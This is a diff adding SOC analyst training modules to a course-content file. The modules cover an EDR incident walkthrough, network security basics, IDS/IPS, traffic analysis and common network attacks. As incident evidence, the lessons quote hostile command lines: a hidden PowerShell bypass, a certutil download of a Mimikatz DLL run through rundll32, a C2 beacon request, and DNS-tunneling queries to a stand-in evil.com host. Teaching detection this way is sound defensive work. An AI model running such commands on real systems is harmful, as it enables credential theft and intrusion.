+[4] rundll32.exe - the credential dumping attempt
+\`\`\`
+
+### Command Line Details
+
+\`\`\`
+[PID 2048] WmiPrvSE.exe
+Command: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding
+Analysis: WMI host process, can be abused for remote execution
+
+[PID 3156] powershell.exe
+Command: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C "IEX..."
+Analysis: 
+  • -NoP = No Profile
+  • -NonI = Non-Interactive
+  • -W Hidden = Hidden Window
+  • -Exec Bypass = Bypass execution policy
+  • ALL are evasion flags!
+
+[PID 3892] cmd.exe
+Command: cmd.exe /c certutil -urlcache -f http://10.0.1.50/debug.dll C:\\Windows\\Temp\\debug.dll
+Analysis: Downloaded malicious DLL using certutil (LOLBAS)
+
+[PID 4212] rundll32.exe
+Command: rundll32.exe C:\\Windows\\Temp\\debug.dll,DllMain
+Analysis: Executed downloaded DLL
+\`\`\`
+
+## Step 3: Network Analysis
+
+\`\`\`
+NETWORK CONNECTIONS
+
+[PID 3892] 02:34:05 UTC
+Protocol: HTTP
+Destination: 10.0.1.50:80
+File Downloaded: debug.dll (245KB)
+
+WHOIS/LOOKUP: 10.0.1.50
+└── Internal IP - likely compromised internal system
+└── Hostname: WORKSTATION-42
+
+CONCLUSION: Attack originated from internal host
+\`\`\`
+
+## Step 4: File Analysis
+
+\`\`\`
+FILE: C:\\Windows\\Temp\\debug.dll
+
+Properties:
+├── Size: 245,760 bytes
+├── Created: 2024-01-15 02:34:05 UTC
+├── Hash: SHA256 7e8f9a0b1c2d3e4f...
+├── Signature: UNSIGNED
+└── VirusTotal: 45/70 detections
+
+Detection Names:
+├── Mimikatz variant
+├── Credential stealer
+├── HackTool:Win64/Mikatz
+
+VERDICT: Confirmed malicious - Mimikatz credential dumper
+\`\`\`
+
+## Step 5: Impact Assessment
+
+\`\`\`
+LSASS ACCESS ANALYSIS
+
+Memory regions accessed:
+└── Credential storage regions
+
+Potential impact:
+☑ All domain credentials at risk
+☑ Password hashes exposed
+☑ Kerberos tickets compromised
+☑ Golden ticket possible
+
+AFFECTED ACCOUNTS:
+├── Domain Admins
+├── Service accounts
+├── Recently logged-in users
+└── All cached credentials
+\`\`\`
+
+## Step 6: Attack Timeline
+
+\`\`\`
+TIMELINE RECONSTRUCTION
+
+01:15:23 - Attacker compromises WORKSTATION-42 (initial access)
+02:30:45 - WMI used for lateral movement to DC-PRIMARY
+02:33:12 - PowerShell downloads attack tools
+02:34:05 - Certutil downloads Mimikatz variant
+02:34:15 - DLL executed via rundll32
+02:34:17 - LSASS memory accessed (DETECTION)
+02:34:45 - EDR terminates process (automatic response)
+
+DWELL TIME: Approximately 1 hour 15 minutes
+\`\`\`
+
+## Step 7: Containment Actions
+
+\`\`\`
+IMMEDIATE ACTIONS TAKEN
+
+[02:35:00] EDR Automatic Response
+☑ Killed rundll32.exe process
+☑ Quarantined debug.dll
+☑ Alert generated
+
+[02:40:00] SOC Response
+☑ Isolated DC-PRIMARY from network
+☑ Isolated WORKSTATION-42 (source)
+☑ Notified IR team lead
+☑ Initiated password reset for domain admins
+
+[02:55:00] IR Team Actions
+☑ Memory dump collected from DC
+☑ Forensic imaging initiated
+☑ krbtgt password reset scheduled
+\`\`\`
+
+## Step 8: Documentation
+
+\`\`\`
+INCIDENT SUMMARY
+
+Ticket: INC-2024-0023
+Severity: CRITICAL (1)
+Category: Credential Theft - Mimikatz
+
+Attack Chain:
+1. Initial compromise of WORKSTATION-42 (unknown vector)
+2. Lateral movement to DC-PRIMARY via WMI
+3. Mimikatz variant downloaded and executed
+4. LSASS memory accessed for credential dumping
+
+Impact:
+- Domain credentials likely compromised
+- Full domain compromise possible
+
+Containment:
+- Both systems isolated
+- Attack process terminated
+- Malicious DLL quarantined
+
+Required Actions:
+- Reset all domain admin passwords
+- Reset krbtgt password (twice, 10 hours apart)
+- Investigate WORKSTATION-42 for initial vector
+- Forest-wide credential reset recommended
+\`\`\`
+
+## Lessons Learned
+
+**What EDR Did Well:**
+- Detected LSASS access in real-time
+- Automatically terminated the attack
+- Provided full visibility into attack chain
+
+**Investigation Key Points:**
+- Process tree revealed lateral movement path
+- Command line analysis showed evasion techniques
+- Network data identified internal source
+- File analysis confirmed Mimikatz
+    `,
+    keyTakeaways: [
+      "EDR provides the telemetry needed to reconstruct attack chains",
+      "Process trees reveal lateral movement and attack progression",
+      "Command line analysis exposes evasion techniques",
+      "LSASS access on domain controllers is a critical security event",
+      "Credential theft on DCs may require forest-wide password resets"
+    ],
+    practicalExercise: {
+      title: "EDR Investigation Scenario",
+      description: "Work through an EDR alert investigation independently.",
+      steps: [
+        "Review the provided EDR alert and telemetry",
+        "Build the process tree from the data",
+        "Analyze command lines for suspicious indicators",
+        "Check network connections and file operations",
+        "Document your findings and recommend actions"
+      ]
+    }
+  },
+
+  // =========================================
+  // MODULE 9: NETWORK SECURITY MONITORING
+  // =========================================
+  {
+    id: "9.1",
+    courseId: "soc-fundamentals",
+    title: "Network Security Fundamentals",
+    content: `
+# Network Security Fundamentals
+
+Understanding network basics is essential for SOC analysts who monitor and investigate network-based threats.
+
+## The OSI Model for Security
+
+\`\`\`
+Layer 7 - Application   │ HTTP, DNS, SMTP         │ Web attacks, malware C2
+Layer 6 - Presentation  │ SSL/TLS, encryption     │ Cert issues, downgrade attacks
+Layer 5 - Session       │ Sessions, auth          │ Session hijacking
+Layer 4 - Transport     │ TCP, UDP                │ Port scans, SYN floods
+Layer 3 - Network       │ IP, ICMP, routing       │ IP spoofing, DDoS
+Layer 2 - Data Link     │ MAC, switches           │ ARP poisoning, MAC spoofing
+Layer 1 - Physical      │ Cables, signals         │ Physical access, tapping
+\`\`\`
+
+## Key Protocols for SOC Analysts
+
+### TCP/IP Basics
+
+\`\`\`
+TCP THREE-WAY HANDSHAKE
+
+Client                    Server
+  │                         │
+  │ ────── SYN ──────────→ │  "Can we connect?"
+  │                         │
+  │ ←───── SYN-ACK ─────── │  "Yes, let's connect"
+  │                         │
+  │ ────── ACK ──────────→ │  "Great, we're connected"
+  │                         │
+  │ ←───── DATA ──────────→│  (Communication)
+
+SECURITY RELEVANCE:
+• SYN flood = Many SYN, no ACK (DoS attack)
+• Half-open connections = SYN scan (recon)
+• Unusual flags = Evasion or crafted packets
+\`\`\`
+
+### Common Ports to Know
+
+| Port | Protocol | Service | Security Relevance |
+|------|----------|---------|-------------------|
+| 21 | TCP | FTP | File exfiltration |
+| 22 | TCP | SSH | Remote access |
+| 23 | TCP | Telnet | Legacy, unencrypted |
+| 25 | TCP | SMTP | Email, spam |
+| 53 | UDP/TCP | DNS | C2, tunneling |
+| 80 | TCP | HTTP | Web traffic |
+| 443 | TCP | HTTPS | Encrypted web |
+| 445 | TCP | SMB | Lateral movement |
+| 3389 | TCP | RDP | Remote desktop |
+| 8080 | TCP | HTTP Proxy | Alt web ports |
+
+### DNS Fundamentals
+
+\`\`\`
+DNS QUERY FLOW
+
+User types: www.example.com
+     │
+     ↓
+┌─────────────────┐
+│ Local Resolver  │ ← Check cache first
+└────────┬────────┘
+         │ (if not cached)
+         ↓
+┌─────────────────┐
+│ Root DNS (.com) │
+└────────┬────────┘
+         ↓
+┌─────────────────┐
+│ TLD DNS         │ 
+└────────┬────────┘
+         ↓
+┌─────────────────┐
+│ Authoritative   │ ← Returns IP: 93.184.216.34
+└─────────────────┘
+
+SECURITY USES:
+• Malware domains → C2 communication
+• DNS tunneling → Data exfiltration
+• DGA domains → Botnet communication
+• DNS poisoning → Redirect to malicious sites
+\`\`\`
+
+## Network Security Devices
+
+### Firewall
+
+\`\`\`
+FIREWALL FUNCTION
+
+Internet ←→ [FIREWALL] ←→ Internal Network
+
+Types:
+├── Packet Filter: IP/port based rules
+├── Stateful: Tracks connection state
+├── Next-Gen (NGFW): Application awareness, IPS
+└── WAF: Web application specific
+
+What SOC Sees:
+• Allowed/denied connections
+• Source/destination IPs and ports
+• Protocol violations
+• Policy violations
+\`\`\`
+
+### IDS/IPS
+
+\`\`\`
+IDS vs IPS
+
+IDS (Detection):
+└── Monitors traffic passively
+└── Generates alerts only
+└── "Alarm system"
+
+IPS (Prevention):
+└── Sits inline with traffic
+└── Can block malicious traffic
+└── "Security guard"
+
+Detection Methods:
+├── Signature-based: Known attack patterns
+├── Anomaly-based: Deviation from baseline
+└── Behavioral: Suspicious behavior patterns
+\`\`\`
+
+### Proxy/Web Gateway
+
+\`\`\`
+PROXY VISIBILITY
+
+User → [PROXY] → Internet
+
+What SOC Sees:
+├── Full URLs visited
+├── User attribution
+├── File downloads
+├── Blocked categories
+├── SSL inspection (if enabled)
+└── Malware downloads
+\`\`\`
+
+## Network Segmentation
+
+\`\`\`
+NETWORK ZONES
+
+┌─────────────────────────────────────────────────────────┐
+│                     INTERNET                             │
+└───────────────────────┬─────────────────────────────────┘
+                        │
+                 [Perimeter FW]
+                        │
+┌───────────────────────┴─────────────────────────────────┐
+│                      DMZ                                 │
+│   Web Servers   │   Mail Gateway   │   VPN Endpoint     │
+└───────────────────────┬─────────────────────────────────┘
+                        │
+                 [Internal FW]
+                        │
+┌───────────────────────┴─────────────────────────────────┐
+│                   INTERNAL NETWORK                       │
+│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │
+│  │ User VLAN   │  │ Server VLAN │  │ Management VLAN │  │
+│  │ 10.0.1.0/24 │  │ 10.0.2.0/24 │  │  10.0.99.0/24   │  │
+│  └─────────────┘  └─────────────┘  └─────────────────┘  │
+└─────────────────────────────────────────────────────────┘
+
+SECURITY PRINCIPLE:
+Limit lateral movement between zones
+\`\`\`
+
+## Network Logging Sources
+
+### Key Logs for SOC
+
+| Source | Information Provided |
+|--------|---------------------|
+| Firewall | Connections allowed/denied, NAT |
+| IDS/IPS | Threat detections, signatures matched |
+| Proxy | URLs, user activity, downloads |
+| DNS | Domain lookups, resolution |
+| DHCP | IP assignments, MAC addresses |
+| NetFlow | Traffic volume, connection metadata |
+| VPN | Remote access sessions |
+    `,
+    keyTakeaways: [
+      "The OSI model helps organize understanding of network attacks",
+      "Know common ports and their security implications",
+      "DNS is heavily abused for C2, tunneling, and malicious redirects",
+      "Firewalls, IDS/IPS, and proxies provide key visibility points",
+      "Network segmentation limits lateral movement during attacks"
+    ],
+    additionalResources: [
+      { title: "TCP/IP Guide", type: "documentation", url: "http://www.tcpipguide.com" },
+      { title: "Wireshark Documentation", type: "tool", url: "https://www.wireshark.org/docs/" }
+    ]
+  },
+  {
+    id: "9.2",
+    courseId: "soc-fundamentals",
+    title: "IDS/IPS Basics",
+    content: `
+# IDS/IPS Basics
+
+Intrusion Detection and Prevention Systems are critical network security tools that SOC analysts interact with daily.
+
+## Understanding IDS vs IPS
+
+\`\`\`
+IDS (Intrusion Detection System)
+├── Passive monitoring
+├── Alerts only, no blocking
+├── Connected via SPAN/TAP
+├── No impact on network latency
+└── "Alarm system"
+
+IPS (Intrusion Prevention System)
+├── Active inline deployment
+├── Can block/drop malicious traffic
+├── Must handle traffic in real-time
+├── Can impact latency if overloaded
+└── "Security guard"
+\`\`\`
+
+## Detection Methods
+
+### Signature-Based Detection
+
+\`\`\`
+HOW IT WORKS:
+Known attack pattern → Rule created → Traffic matched → Alert
+
+EXAMPLE SNORT RULE:
+alert tcp $EXTERNAL_NET any -> $HOME_NET 445 
+(msg:"ET EXPLOIT MS17-010 SMB Remote Code Execution"; 
+ content:"|00 00 00|"; depth:3; 
+ content:"|ff|SMB"; within:5;
+ sid:2024217; rev:1;)
+
+BREAKDOWN:
+• alert tcp: Generate alert for TCP traffic
+• $EXTERNAL_NET any: From any external IP/port
+• $HOME_NET 445: To internal network, SMB port
+• content: Specific bytes to match
+• msg: Description of what was detected
+
+STRENGTHS:
+✓ Low false positives for known threats
+✓ Fast matching
+✓ Easy to understand
+
+WEAKNESSES:
+✗ Cannot detect unknown attacks
+✗ Evasion via encoding/encryption
+✗ Requires constant updates
+\`\`\`
+
+### Anomaly-Based Detection
+
+\`\`\`
+HOW IT WORKS:
+Learn baseline → Monitor for deviation → Alert on anomalies
+
+EXAMPLE BASELINE:
+Normal DNS queries: 50-200/hour
+Normal query length: 15-50 characters
+Normal TTL requests: Standard values
+
+ANOMALY DETECTED:
+DNS queries: 5,000/hour          [!] Volume spike
+Query length: 150+ characters    [!] DNS tunneling?
+Unusual TXT record requests      [!] Data exfiltration?
+
+STRENGTHS:
+✓ Can detect unknown attacks
+✓ Catches behavioral changes
+✓ Good for insider threats
+
+WEAKNESSES:
+✗ Higher false positive rate
+✗ Requires learning period
+✗ Baseline can drift
+\`\`\`
+
+## Common IDS/IPS Solutions
+
+| Solution | Type | Key Features |
+|----------|------|--------------|
+| Snort | Open Source | Signature-based, widely used |
+| Suricata | Open Source | Multi-threaded, high performance |
+| Zeek (Bro) | Open Source | Network analysis framework |
+| Palo Alto | Commercial | NGFW with IPS capabilities |
+| Cisco Firepower | Commercial | Enterprise IPS |
+
+## Understanding IDS Alerts
+
+### Alert Anatomy
+
+\`\`\`
+IDS ALERT EXAMPLE
+
+Timestamp: 2024-01-15 14:32:45 UTC
+Signature: ET MALWARE Win32/Emotet CnC Checkin
+SID: 2024892
+Priority: 1 (High)
+Source: 10.0.1.108:49822
+Destination: 185.234.218.45:443
+Protocol: TCP
+
+Raw Packet:
+[Hex dump of matching traffic]
+
+Classification: A Network Trojan was detected
+\`\`\`
+
+### Alert Priorities
+
+\`\`\`
+PRIORITY LEVELS
+
+Priority 1: High Severity
+├── Active exploitation attempts
+├── Known malware communication
+├── Critical vulnerabilities
+
+Priority 2: Medium Severity
+├── Suspicious activity
+├── Policy violations
+├── Potential threats
+
+Priority 3: Low Severity
+├── Informational alerts
+├── Reconnaissance activity
+├── Minor policy violations
+\`\`\`
+
+## Alert Triage Process
+
+\`\`\`
+IDS ALERT TRIAGE WORKFLOW
+
+1. READ THE ALERT
+   └─ What signature fired?
+   └─ What classification?
+   └─ Source and destination?
+
+2. VALIDATE THE ALERT
+   └─ Is the signature relevant?
+   └─ Is the target vulnerable?
+   └─ Is this expected behavior?
+
+3. INVESTIGATE
+   └─ Check source IP reputation
+   └─ Review related traffic
+   └─ Examine packet content
+
+4. CORRELATE
+   └─ Other alerts from same source?
+   └─ EDR alerts on destination?
+   └─ Similar activity elsewhere?
+
+5. VERDICT
+   └─ True Positive → Respond
+   └─ False Positive → Document/Tune
+   └─ Needs more info → Investigate further
+\`\`\`
+
+## Common False Positive Scenarios
+
+\`\`\`
+FREQUENT FALSE POSITIVES
+
+1. Vulnerability Scanners
+   └─ Internal security tools triggering exploit signatures
+   └─ Solution: Whitelist scanner IPs
+
+2. Penetration Testing
+   └─ Authorized testing looks like attacks
+   └─ Solution: Scheduled testing windows, whitelist
+
+3. Legitimate Software
+   └─ Some apps use techniques that look suspicious
+   └─ Solution: Application baseline, exceptions
+
+4. Encrypted Traffic
+   └─ Partial signature matches in encrypted data
+   └─ Solution: Context-aware tuning
+
+5. Generic Signatures
+   └─ Overly broad detection patterns
+   └─ Solution: Threshold adjustments, refinement
+\`\`\`
+
+## Tuning Best Practices
+
+\`\`\`
+TUNING APPROACH
+
+DON'T: Disable rules that cause false positives
+DO: Tune with specific exceptions
+
+Example:
+Before: Rule fires on all traffic to port 445
+After: Rule excludes traffic from file servers to expected destinations
+
+DOCUMENTATION:
+• Why was tuning needed?
+• What was the false positive?
+• What exception was created?
+• Who approved the change?
+\`\`\`
+    `,
+    keyTakeaways: [
+      "IDS monitors and alerts; IPS can actively block threats",
+      "Signature-based detection is fast but only catches known threats",
+      "Anomaly-based detection can find unknown attacks but has more false positives",
+      "Alert triage requires validating relevance and investigating context",
+      "Tuning should create specific exceptions, not disable rules entirely"
+    ],
+    practicalExercise: {
+      title: "IDS Alert Analysis",
+      description: "Analyze IDS alerts and determine if they are true or false positives.",
+      steps: [
+        "Review 5 sample IDS alerts",
+        "Research each signature to understand what it detects",
+        "Analyze source/destination context for each alert",
+        "Classify each as true positive, false positive, or needs investigation",
+        "Suggest tuning for false positive scenarios"
+      ]
+    }
+  },
+  {
+    id: "9.3",
+    courseId: "soc-fundamentals",
+    title: "Network Traffic Analysis",
+    content: `
+# Network Traffic Analysis
+
+Network traffic analysis involves examining network data to detect and investigate security threats. This skill is essential for SOC analysts.
+
+## Types of Network Data
+
+### 1. Packet Captures (PCAP)
+
+\`\`\`
+PCAP = Full packet capture
+
+Contains:
+├── Complete packet headers
+├── Full payload data
+├── Timing information
+└── All protocol details
+
+Use Cases:
+├── Deep packet inspection
+├── Malware analysis
+├── Forensic investigation
+└── Protocol analysis
+
+Challenges:
+├── Large storage requirements
+├── Privacy concerns (full content)
+├── Performance impact
+└── Encryption limits visibility
+\`\`\`
+
+### 2. NetFlow/IPFIX
+
+\`\`\`
+NETFLOW = Connection metadata
+
+Contains:
+├── Source/Destination IP
+├── Source/Destination Port
+├── Protocol
+├── Byte/Packet counts
+├── Timestamps
+└── Flags
+
+Does NOT Contain:
+├── Payload data
+├── Application content
+└── File transfers
+
+Use Cases:
+├── Traffic volume analysis
+├── Baseline establishment
+├── Anomaly detection
+├── Connection tracking
+\`\`\`
+
+### 3. DNS Logs
+
+\`\`\`
+DNS LOGS
+
+Query:  timestamp | client_ip | query_name | query_type
+Response: timestamp | query_name | response_ip | TTL
+
+Security Analysis:
+├── Known malicious domains
+├── DGA pattern detection
+├── DNS tunneling
+├── Fast flux networks
+└── Typosquatting
+\`\`\`
+
+## Traffic Analysis Techniques
+
+### Baseline Comparison
+
+\`\`\`
+ESTABLISHING BASELINES
+
+Step 1: Collect normal traffic patterns
+- Time of day variations
+- Day of week patterns
+- Seasonal variations
+
+Step 2: Define thresholds
+- Volume: Normal 10GB/day, Alert at 15GB+
+- Connections: Normal 5,000/hour, Alert at 10,000+
+- Countries: Normal US/EU, Alert on unexpected geolocations
+
+Step 3: Alert on deviations
+- Volume spikes: Possible exfiltration
+- Connection spikes: Possible DDoS or scanning
+- New destinations: Possible C2
+\`\`\`
+
+### Beaconing Detection
+
+\`\`\`
+BEACONING PATTERN
+
+Malware often "phones home" at regular intervals:
+
+Timeline visualization:
+|----|----|----|----|----|----|----|----|  (Regular intervals)
+ 15m  15m  15m  15m  15m  15m  15m  15m
+
+Detection Indicators:
+├── Regular time intervals (with slight jitter)
+├── Similar packet sizes
+├── Persistent over long periods
+├── Often to unusual destinations
+└── May be encrypted (HTTPS)
+
+Analysis Query (conceptual):
+GROUP connections BY destination
+CALCULATE interval_stddev
+WHERE interval_stddev < threshold
+AND connection_count > minimum
+→ Potential beaconing behavior
+\`\`\`
+
+### Data Exfiltration Indicators
+
+\`\`\`
+EXFILTRATION RED FLAGS
+
+Volume Anomalies:
+├── Large uploads to unknown destinations
+├── Unusual outbound traffic spikes
+├── After-hours data transfers
+└── Compressed/encrypted file transfers
+
+Protocol Anomalies:
+├── DNS with large TXT responses
+├── ICMP with unexpected payload sizes
+├── HTTP POST with large bodies
+└── Unusual protocol on standard ports
+
+Destination Anomalies:
+├── Personal cloud storage
+├── New external IPs
+├── Tor exit nodes
+└── VPN/proxy services
+\`\`\`
+
+## Practical Analysis Examples
+
+### Example 1: Suspicious HTTP Traffic
+
+\`\`\`
+SCENARIO:
+Host 10.0.1.108 making HTTP requests to 185.234.218.45
+
+ANALYSIS:
+
+GET /gate.php?data=aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= HTTP/1.1
+Host: 185.234.218.45
+User-Agent: Mozilla/5.0
+
+OBSERVATIONS:
+1. Direct IP access (no domain) → Suspicious
+2. "gate.php" → Common malware endpoint name
+3. Base64 data in URL → Data exfiltration
+4. Regular interval requests → Beaconing
+
+DECODE BASE64:
+aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= 
+→ hostname=WORKSTATION-08
+
+VERDICT: Likely malware C2 communication
+\`\`\`
+
+### Example 2: DNS Tunneling
+
+\`\`\`
+SCENARIO:
+High volume of DNS queries to *.tunnel.evil.com
+
+SAMPLE QUERIES:
+aGVsbG8gd29ybGQ.tunnel.evil.com
+dGhpcyBpcyBhIHRlc3Q.tunnel.evil.com
+ZXhmaWx0cmF0ZWQgZGF0YQ.tunnel.evil.com
+
+OBSERVATIONS:
+1. Subdomain looks like Base64 → Data encoding
+2. High query volume → More than normal DNS
+3. All to same parent domain → C2 infrastructure
+4. Query length > 50 chars → Unusual for normal DNS
+
+DECODE SUBDOMAINS:
+aGVsbG8gd29ybGQ → "hello world"
+dGhpcyBpcyBhIHRlc3Q → "this is a test"
+ZXhmaWx0cmF0ZWQgZGF0YQ → "exfiltrated data"
+
+VERDICT: DNS tunneling for data exfiltration
+\`\`\`
+
+### Example 3: Port Scanning
+
+\`\`\`
+SCENARIO:
+Single source connecting to many destinations on same port
+
+NETFLOW DATA:
+10.0.1.50 → 10.0.1.1:22   1 packet
+10.0.1.50 → 10.0.1.2:22   1 packet
+10.0.1.50 → 10.0.1.3:22   1 packet
+... (continues for entire subnet)
+
+OBSERVATIONS:
+1. Sequential IP targets
+2. Same port (22 = SSH)
+3. Single packet per host → SYN scan
+4. Very short duration
+
+VERDICT: Internal port scan, likely reconnaissance
+\`\`\`
+
+## Network Analysis Checklist
+
+\`\`\`
+□ What's the communication pattern (volume, timing)?
+□ Is the destination IP/domain known good, bad, or unknown?
+□ What protocol is being used? Is it normal for that port?
+□ What's in the payload (if available)?
+□ Does this match known C2 patterns?
+□ Is there beaconing behavior?
+□ Are there related alerts from other sources?
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Network data includes PCAPs (full content), NetFlow (metadata), and logs",
+      "Baseline comparison helps identify anomalous traffic patterns",
+      "Beaconing shows regular-interval callbacks typical of malware C2",
+      "DNS tunneling uses encoded data in subdomain names",
+      "Port scanning shows single source probing many targets"
+    ],
+    practicalExercise: {
+      title: "Network Traffic Investigation",
+      description: "Analyze network traffic samples to identify malicious activity.",
+      steps: [
+        "Review the provided NetFlow data summary",
+        "Identify any beaconing patterns",
+        "Analyze the DNS query log for anomalies",
+        "Examine the HTTP requests for suspicious indicators",
+        "Document your findings and conclusions"
+      ]
+    }
+  },
+  {
+    id: "9.4",
+    courseId: "soc-fundamentals",
+    title: "Common Network Attacks",
+    content: `
+# Common Network Attacks
+
+Understanding how attackers operate on networks helps SOC analysts recognize and respond to threats effectively.
+
+## Reconnaissance Attacks
+
+### Port Scanning
+
+\`\`\`
+SCAN TYPES
+
+SYN Scan (Half-Open):
+├── Send SYN packet
+├── Open port: SYN-ACK response
+├── Closed port: RST response
+├── Stealthy, doesn't complete connection
+└── Detection: Many SYN packets, few ACKs
+
+Connect Scan:
+├── Completes full TCP handshake
+├── More detectable (logged connections)
+└── Detection: Short-lived connections to many ports
+
+UDP Scan:
+├── Send UDP packet
+├── Open: Response or no response
+├── Closed: ICMP port unreachable
+└── Detection: ICMP unreachable messages
+
+DETECTION EXAMPLE:
+Source 10.0.1.50 connected to:
+- 10.0.2.1 ports: 22,80,443,445,3389
+- 10.0.2.2 ports: 22,80,443,445,3389
+- 10.0.2.3 ports: 22,80,443,445,3389
+
+Pattern: Same source, multiple targets, multiple ports
+\`\`\`
+
+### Network Mapping
+
+\`\`\`
+NETWORK DISCOVERY TECHNIQUES
+
+ICMP Sweep:
+└── Ping all IPs in range
+└── Map which hosts are alive
+
+ARP Discovery:
+└── ARP who-has for IP range
+└── Works on local network
+
+Service Fingerprinting:
+└── Identify services and versions
+└── Helps find vulnerable systems
+\`\`\`
+
+## Command and Control (C2)
+
+### C2 Communication Patterns
+
+\`\`\`
+COMMON C2 METHODS
+
+HTTP/HTTPS Beaconing:
+├── Regular interval callbacks
+├── GET requests with encoded data
+├── POST for commands/exfiltration
+├── Often mimics legitimate traffic
+
+DNS C2:
+├── Commands encoded in DNS queries
+├── Responses in TXT/CNAME records
+├── Evades web proxies
+└── Low bandwidth but stealthy
+
+Domain Generation Algorithms (DGA):
+├── Malware generates random domain names
+├── C2 registers some of them
+├── Hard to block all possibilities
+└── Detection: High NXDomain responses, entropy analysis
+\`\`\`
+
+### C2 Detection Indicators
+
+\`\`\`
+RED FLAGS FOR C2
+
+Beaconing Behavior:
+☑ Regular interval connections (15min, 30min, etc.)
+☑ Consistent packet sizes
+☑ Persistent over hours/days
+☑ To same destination
+
+Traffic Anomalies:
+☑ Encrypted traffic to unusual destinations
+☑ Non-standard ports for protocols
+☑ Mismatched application headers
+☑ Large volumes of DNS TXT queries
+
+Destination Indicators:
+☑ Recently registered domains
+☑ DGA-looking domain names
+☑ Bulletproof hosting providers
+☑ Tor exit nodes
+\`\`\`
+
+## Lateral Movement
+
+### SMB-Based Movement
+
+\`\`\`
+SMB ATTACK TECHNIQUES
+
+PsExec/Remote Execution:
+├── Creates service on remote host
+├── Executes payload
+├── Uses SMB port 445
+└── Detection: Event ID 7045, remote service creation
+
+Pass-the-Hash:
+├── Stolen NTLM hash used for auth
+├── No password needed
+├── Works with SMB, WMI, etc.
+└── Detection: Unusual auth patterns, Event ID 4624 Type 3
+
+SMB Shares:
+├── Map administrative shares (C$, ADMIN$)
+├── Copy tools/malware
+├── Execute remotely
+└── Detection: Unusual share access, file copies
+\`\`\`
+
+### WMI and PowerShell Remoting
+
+\`\`\`
+REMOTE EXECUTION METHODS
+
+WMI (Windows Management Instrumentation):
+├── Creates process on remote host
+├── Port 135 (RPC) + dynamic ports
+├── Detection: WmiPrvSE.exe spawning processes
+
+PowerShell Remoting:
+├── Port 5985 (HTTP) or 5986 (HTTPS)
+├── Full PowerShell capabilities remotely
+├── Detection: wsmprovhost.exe, Event ID 4103/4104
+
+RDP (Remote Desktop):
+├── Port 3389
+├── Interactive session
+├── Detection: Event ID 4624 Type 10
+\`\`\`
+
+## Data Exfiltration
+
+### Exfiltration Techniques
+
+\`\`\`
+EXFILTRATION METHODS
+
+Direct Upload:
+├── FTP, SFTP, SCP
+├── Cloud storage (Dropbox, GDrive)
+├── File sharing services
+└── Detection: Large outbound transfers
+
+Protocol Tunneling:
+├── DNS tunneling (data in queries)
+├── ICMP tunneling (data in ping)
+├── HTTP tunneling (data in requests)
+└── Detection: Protocol anomalies
+
+Covert Channels:
+├── Steganography (data in images)
+├── Encrypted containers
+├── Custom protocols on standard ports
+└── Detection: Baseline deviation
+\`\`\`
+
+### Detection Strategies
+
+\`\`\`
+EXFILTRATION DETECTION
+
+Volume-Based:
+├── Large outbound data volumes
+├── Unusual upload/download ratios
+├── After-hours transfers
+└── Compressed file uploads
+
+Destination-Based:
+├── Personal cloud storage
+├── Unknown external hosts
+├── Newly registered domains
+├── Known file sharing sites
+
+Content-Based (DLP):
+├── Sensitive data patterns
+├── Document classifications
+├── PII/PHI detection
+└── Source code markers
+\`\`\`
+
+## Attack Detection Summary
+
+\`\`\`
+NETWORK ATTACK INDICATORS CHEAT SHEET
+
+Reconnaissance:
+• Port scans: Single source, many targets/ports
+• Host discovery: ICMP sweep, ARP requests
+
+C2 Communication:
+• Beaconing: Regular intervals, same destination
+• DNS C2: Long queries, TXT records, high NXDomain
+• DGA: Random-looking domains, high entropy
+
+Lateral Movement:
+• SMB: Port 445, unusual access to shares
+• WMI: Port 135, WmiPrvSE spawning processes
+• RDP: Port 3389, unusual login patterns
+
+Exfiltration:
+• Volume: Large outbound transfers
+• Protocols: DNS tunneling, ICMP anomalies
+• Destinations: Cloud storage, unknown hosts
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Port scanning shows single source connecting to many targets/ports",
+      "C2 traffic often exhibits beaconing patterns with regular intervals",
+      "Lateral movement uses SMB, WMI, PowerShell Remoting, and RDP",
+      "Exfiltration can use direct uploads, protocol tunneling, or covert channels",
+      "Baseline knowledge is essential for detecting anomalous activity"
+    ],
+    practicalExercise: {
+      title: "Attack Pattern Recognition",
+      description: "Identify attack patterns in sample network data.",
+      steps: [
+        "Review the network traffic samples provided",
+        "Identify any reconnaissance activity",
+        "Look for C2 communication patterns",
+        "Find evidence of lateral movement",
+        "Detect any data exfiltration indicators"
+      ]
+    }
+  },
+
+  // =========================================
+  // MODULE 10: SOC ANALYST BEST PRACTICES
+  // =========================================
+  {
+    id: "10.1",
+    courseId: "soc-fundamentals",
+    title: "Building Investigation Skills",
+    content: `
+# Building Investigation Skills
+
+Becoming an effective SOC analyst requires developing strong analytical and investigation skills beyond just technical knowledge.
+
+## The Analytical Mindset
+
+### Think Like a Detective
+
+\`\`\`
+INVESTIGATION APPROACH
+
+1. OBSERVE
+   └─ What exactly do you see?
+   └─ What data is available?
+   └─ What doesn't look right?
+
+2. HYPOTHESIZE
+   └─ What could explain this?
+   └─ What are alternative explanations?
+   └─ What would prove/disprove each?
+
+3. TEST
+   └─ Gather evidence for/against hypotheses
+   └─ Look for corroborating data
+   └─ Challenge your assumptions
+
+4. CONCLUDE
+   └─ What does the evidence show?
+   └─ How confident are you?
+   └─ What's still unknown?
+\`\`\`
+
+### Critical Thinking Skills
+
+**Question Everything:**
+- Why did this alert fire?
+- Is this really malicious or could it be benign?
+- What am I not seeing?
+- What would an attacker do next?
+
+**Avoid Cognitive Biases:**
+
+| Bias | Description | Mitigation |
+|------|-------------|------------|
+| Confirmation | Seeking only supporting evidence | Actively look for contradicting data |
+| Anchoring | Fixating on first piece of info | Consider alternatives before deciding |
+| Availability | Relying on recent/memorable events | Check historical data and baselines |
+| Tunnel Vision | Focusing too narrowly | Step back and see the bigger picture |
+
+## Building Technical Intuition
+
+### Pattern Recognition
+
+\`\`\`
+DEVELOP YOUR INTUITION
+
+Level 1: Recognition
+└─ "I've seen this before"
+└─ Match current to past alerts
+
+Level 2: Understanding
+└─ "I know why this happens"
+└─ Understand the underlying mechanism
+
+Level 3: Prediction
+└─ "I know what comes next"
+└─ Anticipate attacker behavior
+
+Level 4: Innovation
+└─ "I can find what others miss"
+└─ Develop new detection methods
+\`\`\`
+
